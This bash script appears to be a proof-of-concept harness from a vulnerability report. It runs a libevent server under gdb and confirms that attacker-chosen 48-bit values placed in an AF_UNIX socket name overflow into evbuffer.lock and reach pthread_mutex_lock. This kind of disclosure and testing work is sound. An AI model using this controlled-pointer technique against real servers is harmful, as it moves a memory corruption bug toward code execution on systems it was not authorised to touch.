#!/bin/bash
# Chosen-address probe: attacker-chosen 48-bit values placed in the AF_UNIX
# abstract name land in the adjacent evbuffer.lock and are passed as the
# mutex argument to pthread_mutex_lock in the production libevent server.
set -uo pipefail
D="$(cd "$(dirname "$0")" && pwd)"
E="$D/evidence"; mkdir -p "$E"
SOCK=/tmp/libevent_r1.sock
PASS=0; FAIL=0
ok()  { PASS=$((PASS+1)); printf 'PASS %s\n' "$1"; }
bad() { FAIL=$((FAIL+1)); printf 'FAIL %s\n' "$1"; }
wait_sock() { for i in $(seq 1 100); do [ -S "$SOCK" ] && return 0; sleep 0.05; done; return 1; }

for ADDR in 0x1234567890AB 0xDEADBEEF1337 0xCAFEBABE9988; do
    out="$E/gdb-${ADDR}.log"
    rm -f "$SOCK"
    cat > "$E/gdb-${ADDR}.cmd" <<GDB
set pagination off
set confirm off
handle SIGPIPE nostop noprint pass
handle SIGSEGV stop nopass
run
echo === SIGSEGV CAUGHT ===
info registers rdi rsi rip
bt 6
quit
GDB
    gdb -batch -x "$E/gdb-${ADDR}.cmd" --args \
        "$D/build-vuln-prod/r1_server_threaded" >"$out" 2>&1 &
    pid=$!
    wait_sock || true
    "$D/build-vuln-prod/r1_client" set 102 "$ADDR" >"$E/gdb-${ADDR}.client" 2>&1 || true
    sleep 1.5
    kill -9 "$pid" 2>/dev/null || true
    rm -f "$SOCK"
    low=$(printf '%s' "$ADDR" | tr 'A-F' 'a-f')
    if grep -qi "mutex=$low" "$out"; then ok "chosen pointer $ADDR reaches pthread_mutex_lock"; else bad "chosen pointer $ADDR not found in gdb output"; fi
    if grep -qiE "rdi[[:space:]]+0x${low#0x}" "$out"; then ok "rdi holds chosen pointer $ADDR"; else bad "rdi not chosen for $ADDR"; fi
    if grep -q 'SIGSEGV' "$out"; then ok "SIGSEGV observed for $ADDR"; else bad "no SIGSEGV for $ADDR"; fi
    if grep -q 'evbuffer_get_length' "$out"; then ok "evbuffer_get_length frame for $ADDR"; else bad "no evbuffer_get_length frame for $ADDR"; fi
    if grep -q 'peer_socklen=110' "$out"; then ok "peer_socklen=110 for $ADDR"; else bad "no peer_socklen=110 for $ADDR"; fi
done
if grep -q 'sun_path\[102\.\.107\]' "$E/gdb-0xCAFEBABE9988.client"; then ok 'client placed chosen bytes at sun_path[102..107]'; else bad 'client offset log missing'; fi
printf 'PROBE: %d PASS / %d FAIL\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
